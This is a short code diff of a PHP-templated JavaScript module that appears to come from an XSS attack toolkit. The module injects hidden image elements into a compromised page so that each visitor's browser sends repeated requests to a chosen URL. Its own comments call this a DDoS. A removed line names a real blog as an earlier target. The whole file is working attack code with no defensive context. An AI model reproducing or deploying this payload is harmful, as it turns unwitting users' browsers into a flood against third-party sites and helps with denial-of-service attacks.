@@ -1,15 +1,24 @@
-
+<?
+# send ddos to url by appending images to the docuument. notifies when complete
+#
+?>
 var xssurl = decodeURIComponent("<?=$url?>");
 var xssrequests = <?=(isset($requests)) ? $requests : 10?>;
-/*
-var xssurl = "http://blog.bodybuilding.com/";
-for (var i=0;i=<<?=$requests?>;i++) {
-*/
 
-for (var i=0;i<xssrequests;i++) {
-var url2 = xssurl;
-if (xssurl.indexOf("?")>0) { url2 = xssurl + "&v="+i; }
-else { url2 = xssurl + "?v="+i; }
-console.log(url2);
-ci(url2, "display:none;", "sploit");
+// called after the DoS finishes
+function xssdosfin() {
+	debug(xssrequests + " DoS complete");
+	xsscls();
 }
+
+debug("sending " + xssrequests + " requests to " + xssurl);
+for (var i=0;i<xssrequests-1;i++) {
+	var url2 = xssurl;
+	if (xssurl.indexOf("?")>0) { url2 = xssurl + "&v="+i; }
+	else { url2 = xssurl + "?v="+i; }
+	ci(url2, "display:none;", "sploit", false, false);
+}
+
+// the last image has callbacks so we know when the last request is sent
+ci(url2, "display:none;", "sploit", xssdosfin, xssdosfin);
+debug("images added to document");
